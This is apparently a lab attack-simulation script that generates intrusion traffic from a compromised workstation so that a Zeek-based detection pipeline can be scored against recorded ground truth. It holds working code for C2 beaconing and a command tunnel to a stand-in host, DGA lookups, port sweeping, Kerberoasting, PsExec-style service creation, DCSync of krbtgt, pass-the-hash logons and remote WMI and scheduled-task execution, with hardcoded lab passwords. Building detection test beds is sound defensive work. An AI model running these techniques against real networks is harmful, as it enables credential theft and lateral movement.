"""The intrusion, run from the compromised workstation (ws-04) during the attack session only.
Every step uses real protocols against real services (Samba AD DC, SMB servers, the C2 server),
so Zeek sees exactly what it would see on a real network. Steps are compressed into minutes.

  t+0s    C2-01  HTTPS beacon to cdn-update-check.online every ~8s (20% jitter) for the whole session
  t+5s    C2-02  long-lived TLS tunnel to the C2 server on 8443
  t+30s   C2-03  DGA: 60 random .info lookups, almost all NXDOMAIN
  t+60s   LM-08  internal sweep of 445/135/3389 across 10.77.0.1-127
  t+90s   LM-06  Kerberoasting: RC4 service tickets for the 6 service accounts
  t+120s  LM-01  PsExec style: ADMIN$ + PSEXESVC.exe + svcctl CreateService on ws-02 and fs01
  t+150s  LM-07  DCSync: drsuapi DRSGetNCChanges for krbtgt against dc01 (stolen adm_it password)
  t+180s  LM-05  pass-the-hash: NTLM logons with adm_it's hash to 6 hosts
  t+210s  LM-02  WMI attempt (DCOM RemoteCreateInstance) against dc01, best effort
  t+220s  LM-03  remote scheduled task attempt (\\pipe\\atsvc) against fs01, best effort

The ground truth (what happened, from which host, when) goes to /pcap/attack-day/ground_truth.json.
Only the evaluation reads it; the detection pipeline never does.
"""
import json
import random
import socket
import ssl
import string
import threading
import time

import requests
import urllib3

from lab_lib import DC, DOMAIN, HOSTS, active, deploy_service, log, resolve, session

urllib3.disable_warnings()
ME = HOSTS["ws-04"]
C2_DOMAIN, C2_IP = "cdn-update-check.online", "10.77.0.250"
ADMIN_PW = "Adm-Passw0rd!"
truth = []


def mark(technique, hunt, target, note=""):
    truth.append({"ts": time.time(), "src": ME, "technique": technique, "expected_hunt": hunt,
                  "target": target, "note": note})
    log("ATTACK", technique, "->", target, note)


def beacon():
    mark("C2 beaconing", "C2-01", C2_DOMAIN)
    s = requests.Session()
    while active():
        resolve(C2_DOMAIN)
        try:
            s.post(f"https://{C2_DOMAIN}/api/v1/poll", data=b"id=ws04&s=" + b"A" * 180, timeout=5, verify=False,
                   headers={"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)"})
        except Exception:
            pass
        time.sleep(8 * random.uniform(0.8, 1.2))


def tunnel(seconds):
    mark("Long-lived C2 tunnel", "C2-02", f"{C2_IP}:8443", f"{seconds}s")
    ctx = ssl.create_default_context()
    ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
    try:
        with ctx.wrap_socket(socket.create_connection((C2_IP, 8443), timeout=10)) as c:
            end = time.time() + seconds
            while time.time() < end and active():
                c.sendall(b"whoami /all\n")
                c.recv(4096)
                time.sleep(15)
    except Exception as e:
        log("tunnel", e)


def dga():
    mark("DGA lookups", "C2-03", "60 random .info domains")
    for _ in range(60):
        resolve("".join(random.choices(string.ascii_lowercase, k=random.randint(12, 16))) + ".info")
        time.sleep(random.uniform(0.2, 1.0))


def sweep():
    mark("Internal port sweep", "LM-08", "10.77.0.1-127")
    for i in range(1, 128):
        for port in (445, 135, 3389):
            try:
                socket.create_connection((f"10.77.0.{i}", port), timeout=0.15).close()
            except Exception:
                pass


def kerberoast():
    """Ask the KDC for an RC4 service ticket for every service account (what Rubeus / GetUserSPNs do).
    MIT kvno is used because it requests exactly the encryption type we ask for."""
    from lab_lib import sh
    mark("Kerberoasting", "LM-06", "6 service accounts")
    env = "KRB5CCNAME=/tmp/roast"
    sh(f"echo 'User-Passw0rd!' | {env} kinit user04@CORP.LAB >/dev/null 2>&1")
    for s in ["sql", "web", "backup", "report", "crm", "bi"]:
        rc = sh(f"{env} kvno -e rc4-hmac MSSQLSvc/{s}.corp.lab:1433")
        if rc:
            log("kvno failed", s, rc)
        time.sleep(random.uniform(1, 3))


def psexec():
    from impacket.ntlm import compute_nthash
    for t in (HOSTS["ws-02"], HOSTS["fs01"]):
        mark("PsExec-style remote service", "LM-01", t)
        try:
            deploy_service(t, "adm_it", nthash=compute_nthash(ADMIN_PW).hex(), filename="PSEXESVC.exe", svc="PSEXESVC")
        except Exception as e:
            log("psexec", t, e)
        time.sleep(5)


def dcsync():
    from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
    from impacket.smbconnection import SMBConnection
    mark("DCSync", "LM-07", DC, "krbtgt")
    try:
        smb = SMBConnection(DC, DC, timeout=10)
        smb.login("adm_it", ADMIN_PW, DOMAIN)
        ro = RemoteOperations(smb, False, DC)
        NTDSHashes(None, None, isRemote=True, remoteOps=ro, justNTLM=True, justUser="krbtgt",
                   perSecretCallback=lambda *a: log("DCSync got a hash")).dump()
        ro.finish()
    except Exception as e:
        log("dcsync", e)


def pass_the_hash():
    from impacket.ntlm import compute_nthash
    from impacket.smbconnection import SMBConnection
    targets = [ip for n, ip in HOSTS.items() if n.startswith("ws-") and ip != ME] + [HOSTS["fs01"], HOSTS["sccm01"]]
    mark("Pass-the-hash NTLM fan-out", "LM-05", f"{len(targets)} hosts")
    for t in targets:
        try:
            c = SMBConnection(t, t, timeout=5)
            c.login("adm_it", "", DOMAIN, "", compute_nthash(ADMIN_PW).hex())
            c.listShares()
            c.logoff()
        except Exception as e:
            log("pth", t, type(e).__name__)
        time.sleep(random.uniform(2, 6))


def wmi():
    from impacket.dcerpc.v5.dcom import wmi as w
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    mark("WMI remote exec attempt", "LM-02", DC)
    try:
        d = DCOMConnection(DC, "adm_it", ADMIN_PW, DOMAIN)
        d.CoCreateInstanceEx(w.CLSID_WbemLevel1Login, w.IID_IWbemLevel1Login)
        d.disconnect()
    except Exception as e:
        log("wmi (expected to fail on Samba)", type(e).__name__)


def schtask():
    from impacket.dcerpc.v5 import transport, tsch
    mark("Remote scheduled task attempt", "LM-03", HOSTS["fs01"])
    try:
        t = transport.DCERPCTransportFactory(rf"ncacn_np:{HOSTS['fs01']}[\pipe\atsvc]")
        t.set_credentials("adm_it", ADMIN_PW, DOMAIN)
        r = t.get_dce_rpc()
        r.connect()
        r.bind(tsch.MSRPC_UUID_TSCHS)
        tsch.hSchRpcRegisterTask(r, "\\Updater", "<Task/>", tsch.TASK_CREATE, None, tsch.TASK_LOGON_NONE)
    except Exception as e:
        log("schtask (expected to fail on Samba)", type(e).__name__)


def run_step(at, f, *a):
    def go():
        time.sleep(at)
        try:
            f(*a)
        except Exception as e:
            log("step failed", f.__name__, e)
    th = threading.Thread(target=go, daemon=True)
    th.start()
    return th


while not session().startswith("attack"):
    time.sleep(1)
log("attack session started")
t0 = time.time()
steps = [run_step(0, beacon), run_step(5, tunnel, 240), run_step(30, dga), run_step(60, sweep),
         run_step(90, kerberoast), run_step(120, psexec), run_step(150, dcsync), run_step(180, pass_the_hash),
         run_step(210, wmi), run_step(220, schtask)]
for th in steps[2:]:
    th.join()
while active():
    time.sleep(1)
json.dump({"compromised_hosts": [ME], "c2": [C2_DOMAIN, C2_IP], "steps": truth},
          open(f"/pcap/attack-day/ground_truth.json", "w"), indent=2)
log("ground truth written")
while True:
    time.sleep(3600)
